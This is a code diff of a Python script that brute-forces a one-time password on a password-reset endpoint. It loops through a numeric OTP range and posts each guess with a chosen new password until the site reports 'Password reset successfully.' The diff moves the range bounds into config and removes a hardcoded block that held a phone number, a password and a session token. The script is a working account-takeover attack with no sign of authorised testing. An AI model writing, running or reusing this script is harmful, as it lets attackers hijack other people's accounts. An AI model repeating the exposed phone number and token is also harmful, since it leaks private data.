@@ -13,16 +13,10 @@ def forgot_password(mobile, otp, password, cnf_password):
         "_token": config.TOKEN
     }
 
-    d = {
-                "mobile": 7975580881,
-                "otp": "22878",
-                "password": "APassword@123",
-                "password_confirmation": "APassword@123",
-                "_token": "mSn7QwTsIYT1RuTMoGAJuBqnxMGpIWKKIIpsm6zV"
-            }
 
 
-    response = requests.post(config.WITHDRAW_URL, data=d)
+
+    response = requests.post(config.WITHDRAW_URL, data=data)
 
     if response.status_code == 200:
         if re.search(r"Password reset successfully.", response.text):
@@ -43,9 +37,9 @@ if __name__ == "__main__":
     mobile = config.MOBILE_NUMBER
     password = config.PASSWORD
     cnf_password = config.CNF_PASSWORD
-    otp = 3739
+    otp = config.R1
 
-    while otp <= 3745:
+    while otp <= config.R2:
         try:
             result = forgot_password(mobile, otp, password, cnf_password)
             if result == 1:
